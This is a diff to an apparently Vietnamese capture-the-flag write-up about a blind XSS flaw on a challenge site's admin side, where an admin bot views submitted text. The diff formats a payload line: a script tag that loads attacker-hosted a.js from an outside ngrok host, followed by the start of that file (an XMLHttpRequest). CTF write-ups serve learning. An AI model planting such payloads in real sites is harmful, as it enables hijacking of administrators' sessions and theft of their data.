@@ -18,9 +18,10 @@ We all love our hacker t-shirts. Make your own custom ones.
 
 Ngồi test cả buổi cứ tưởng SSRF, Command Injection, RCE nhưng chẳng thèm thử XSS, và đúng thế, website dính lỗi XSS ở phía admin khi text ta gửi sẽ được 1 con bot go to để xem, đây là XSS blind, chơi CTF lần sau hãy chú ý nhiều hơn.
 
-Ta gửi đoạn script sau, việc trỏ đến `a.js` giúp ta edit payload dễ hơn.
+Ta gửi đoạn script sau, việc trỏ đến `a.js` giúp ta edit payload dễ hơn:
+```html
 <script src="http://a047-42-112-56-248.ngrok.io/a.js"></script>
-
+```
 file `a.js`:
 ```js
 var xhr = new XMLHttpRequest;
